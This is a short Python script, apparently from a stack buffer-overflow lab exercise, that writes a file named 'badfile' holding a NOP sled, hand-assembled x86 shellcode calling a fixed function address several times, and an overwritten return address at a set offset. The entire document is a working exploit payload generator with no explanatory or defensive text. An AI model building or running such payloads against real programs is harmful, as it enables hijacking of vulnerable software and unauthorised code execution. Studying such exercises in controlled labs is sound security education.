shellcode= (
"\x6a\x06"
"\x6a\x01"
"\xbb\x10\x85\x04\x08"
"\xff\xd3"
"\x6a\x00"
"\x50"
"\xbb\x10\x85\x04\x08"
"\xff\xd3"
"\x6a\x05"
"\x50"
"\xbb\x10\x85\x04\x08"
"\xff\xd3"
"\x6a\x00"
"\x50"
"\xbb\x10\x85\x04\x08"
"\xff\xd3"
"\x6a\x04"
"\x50"
"\xbb\x10\x85\x04\x08"
"\xff\xd3"
"\x6a\x02"
"\x50"
"\xbb\x10\x85\x04\x08"
"\xff\xd3"
).encode('latin-1')
# Fill the content with NOPs
content = bytearray(0x90 for i in range(1018))

# Put the shellcode at the end
start = 900
content[start:start+len(shellcode)] = shellcode

# Put the address
shell_return=0xbfffe512+800
offset=374


content[offset+4:offset+8] = (shell_return).to_bytes(4,byteorder='little')

#content = bytearray(0x41 for i in range(20))
#write
with open('badfile','wb') as f:
    f.write(content)

